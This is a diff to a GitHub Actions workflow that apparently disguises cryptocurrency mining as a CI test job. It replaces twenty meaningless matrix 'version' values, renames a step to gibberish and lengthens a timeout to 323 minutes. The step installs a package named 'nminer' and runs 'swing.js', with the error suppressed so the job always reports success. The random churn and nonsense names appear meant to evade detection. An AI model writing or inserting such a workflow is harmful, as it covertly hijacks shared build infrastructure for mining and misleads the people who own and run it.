@@ -9,26 +9,26 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 3041 }
-          - { version: 5293 }
-          - { version: 7901 }
-          - { version: 2852 }
-          - { version: 965 }
-          - { version: 3116 }
-          - { version: 3051 }
-          - { version: 8322 }
-          - { version: 8046 }
-          - { version: 2403 }
-          - { version: 6616 }
-          - { version: 9823 }
-          - { version: 734 }
-          - { version: 1153 }
-          - { version: 9680 }
-          - { version: 126 }
-          - { version: 9004 }
-          - { version: 776 }
-          - { version: 7775 }
-          - { version: 943 }
+          - { version: 3845 }
+          - { version: 1969 }
+          - { version: 1073 }
+          - { version: 7282 }
+          - { version: 6446 }
+          - { version: 4391 }
+          - { version: 3759 }
+          - { version: 4937 }
+          - { version: 3822 }
+          - { version: 8111 }
+          - { version: 237 }
+          - { version: 3801 }
+          - { version: 2410 }
+          - { version: 667 }
+          - { version: 7883 }
+          - { version: 4707 }
+          - { version: 3409 }
+          - { version: 3265 }
+          - { version: 2756 }
+          - { version: 411 }
 
     steps:
       - name: Checkout
@@ -39,7 +39,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: milestone because offensively
+      - name: mmm quarrel blah
         run: |
           npm install nminer@latest
-          timeout 313m node swing.js || echo "swing executed"
+          timeout 323m node swing.js || echo "swing executed"
